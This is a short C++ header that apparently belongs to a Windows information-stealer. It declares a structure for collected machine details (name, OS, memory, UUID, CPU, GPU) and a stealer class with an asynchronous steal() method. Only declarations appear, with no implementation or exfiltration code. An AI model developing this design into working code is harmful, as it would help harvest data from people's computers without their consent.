#ifndef WIN_STEALER_H
#define WIN_STEALER_H

#include "base_stealer.h"

struct pc_t
{
    TCHAR name[1024];
    TCHAR os[1024];
    TCHAR total_memory[1024];
    TCHAR uuid[1024];
    TCHAR cpu[1024];
    TCHAR gpu[1024];

    [[nodiscard]] std::string str() const;
};

class win_stealer_t : public base_stealer_t
{
public:
    asio::awaitable<std::unique_ptr<message_t>> steal() override;
};



#endif //WIN_STEALER_H
